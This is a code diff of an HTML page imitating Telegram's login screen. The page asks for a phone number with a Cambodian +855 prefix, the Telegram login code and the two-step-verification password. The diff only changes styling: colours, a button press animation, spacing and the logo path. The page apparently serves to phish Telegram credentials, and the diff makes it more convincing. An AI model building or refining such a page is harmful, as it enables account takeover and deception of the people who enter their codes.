@@ -12,8 +12,9 @@
     --text-main: #ffffff;
     --text-sub: #aaaaaa;
     --accent: #8774e1;
+    --accent-hover: #7966d3;
   }
-  * { box-sizing: border-box; }
+  * { box-sizing: border-box; touch-action: manipulation; }
   body {
     margin: 0;
     min-height: 100vh;
@@ -24,7 +25,7 @@
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     padding: 20px;
     color: var(--text-main);
-    touch-action: manipulation;
+    user-select: none;
   }
   .card {
     width: 100%;
@@ -41,6 +42,7 @@
     align-items: center;
     justify-content: center;
     box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+    background: #2481cc;
   }
   .logo img {
     width: 100%;
@@ -87,7 +89,7 @@
     border: none;
     outline: none;
     color: var(--text-main);
-    font-size: 16px;
+    font-size: 16px !important;
   }
   .country-select {
     display: flex;
@@ -158,16 +160,19 @@
     font-size: 16px;
     font-weight: 600;
     cursor: pointer;
-    transition: background-color 0.2s;
+    transition: background-color 0.2s, transform 0.05s;
   }
   .btn-primary:hover {
-    background-color: #7966d3;
+    background-color: var(--accent-hover);
+  }
+  .btn-primary:active {
+    transform: scale(0.98);
   }
   .alt-links {
-    margin-top: 20px;
+    margin-top: 24px;
     display: flex;
     flex-direction: column;
-    gap: 20px;
+    gap: 18px;
   }
   .alt-links a {
     color: var(--accent);
@@ -186,9 +191,9 @@
     
     <!-- STEP 1: Phone Form -->
     <div id="step-phone">
-      <!-- ទាញយករូបភាព Logo ពី GitHub (IMG_8300.jpeg) -->
+      <!-- ទាញយករូបភាព Logo ពី Static Folder លើ GitHub -->
       <div class="logo">
-        <img src="IMG_8300.jpeg" alt="Telegram Logo">
+        <img src="/static/IMG_8300.jpeg" alt="Telegram Logo">
       </div>
       
       <h1>Telegram</h1>
@@ -209,7 +214,7 @@
       <!-- Phone Number Field -->
       <div class="field">
         <label>Your phone number</label>
-        <input id="phone-input" type="text" value="+855 " oninput="formatPhoneNumber(this)" onkeydown="preventPrefixDelete(event, this)" onpaste="handlePaste(event, this)" />
+        <input id="phone-input" type="text" value="+855 " placeholder="+855 15 944 782" oninput="formatPhoneNumber(this)" onkeydown="preventPrefixDelete(event, this)" onpaste="handlePaste(event, this)" />
       </div>
 
       <!-- Keep me signed in -->
@@ -239,7 +244,7 @@
       <div class="text-left space-y-4">
         <div class="field">
           <label>Telegram Code</label>
-          <input id="otp-input" type="text" placeholder="Enter code" maxlength="6" class="text-center font-mono tracking-widest text-lg">
+          <input id="otp-input" type="text" placeholder="Enter code" maxlength="6" class="text-center font-mono tracking-widest text-xl">
         </div>
 
         <!-- Input 2FA Password -->
@@ -251,7 +256,7 @@
 
       <button id="btn-verify" onclick="submitOTP()" class="btn-primary">VERIFY & LOGIN</button>
       <div>
-        <button onclick="goBack()" class="text-xs text-[#8774e1] hover:underline transition">Change Phone Number</button>
+        <button onclick="goBack()" class="text-xs text-[#8774e1] hover:underline active:opacity-70 transition">Change Phone Number</button>
       </div>
     </div>
 
